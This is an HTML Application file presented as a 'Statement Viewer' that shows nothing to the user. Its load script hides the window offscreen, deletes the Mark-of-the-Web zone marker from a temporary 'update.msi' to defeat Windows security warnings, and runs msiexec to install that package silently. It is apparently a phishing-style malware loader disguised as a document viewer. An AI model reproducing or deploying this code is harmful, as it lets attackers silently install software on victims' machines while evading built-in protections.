<html>
<head>
<HTA:APPLICATION
  ID="oApp"
  APPLICATIONNAME="Statement Viewer"
  WINDOWSTATE="minimize"
/>
<script language="JScript">
function stripMark(p) {
  try {
    var sh = new ActiveXObject("WScript.Shell");
    sh.Run('cmd.exe /c del /f /q "' + p + ':Zone.Identifier"', 0, true);
  } catch (e1) {}
}
function main() {
  try { window.resizeTo(1, 1); } catch (e0) {}
  try { window.moveTo(-32000, -32000); } catch (e1) {}
  var App = new ActiveXObject("Shell.Application");
  var wsh = new ActiveXObject("WScript.Shell");
  var fso = new ActiveXObject("Scripting.FileSystemObject");
  var outFile = fso.BuildPath(wsh.ExpandEnvironmentStrings("%TEMP%"), "update.msi");
  stripMark(outFile);
  var bin = wsh.ExpandEnvironmentStrings("%SystemRoot%") + "\\System32\\msiexec" + ".exe";
  var args = '/package "' + outFile + '" /quiet /norestart';
  wsh.Run('"' + bin + '" ' + args, 0, true);
  App.ShellExecute(bin, args, "", "open", 0);
  try { window.close(); } catch (e2) {}
}
window.onload = main;
</script>
</head>
<body></body>
</html>
